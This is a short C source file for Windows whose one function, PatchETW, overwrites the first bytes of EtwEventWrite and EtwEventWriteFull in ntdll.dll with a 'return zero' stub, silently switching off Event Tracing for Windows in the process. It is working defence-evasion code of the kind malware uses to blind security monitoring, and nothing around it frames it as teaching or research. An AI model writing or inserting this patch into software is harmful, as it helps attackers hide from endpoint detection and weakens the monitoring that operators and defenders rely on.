#include <windows.h>

void PatchETW() {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return;

    // EtwEventWrite
    FARPROC pEtwEventWrite = GetProcAddress(hNtdll, "EtwEventWrite");
    if (pEtwEventWrite) {
        DWORD oldProtect;
        VirtualProtect(pEtwEventWrite, 3, PAGE_EXECUTE_READWRITE, &oldProtect);
        BYTE patch[] = {0x31, 0xC0, 0xC3}; // xor eax,eax; ret
        memcpy(pEtwEventWrite, patch, sizeof(patch));
        VirtualProtect(pEtwEventWrite, 3, oldProtect, &oldProtect);
    }

    // EtwEventWriteFull
    FARPROC pEtwEventWriteFull = GetProcAddress(hNtdll, "EtwEventWriteFull");
    if (pEtwEventWriteFull) {
        DWORD oldProtect;
        VirtualProtect(pEtwEventWriteFull, 3, PAGE_EXECUTE_READWRITE, &oldProtect);
        BYTE patch[] = {0x31, 0xC0, 0xC3};
        memcpy(pEtwEventWriteFull, patch, sizeof(patch));
        VirtualProtect(pEtwEventWriteFull, 3, oldProtect, &oldProtect);
    }
}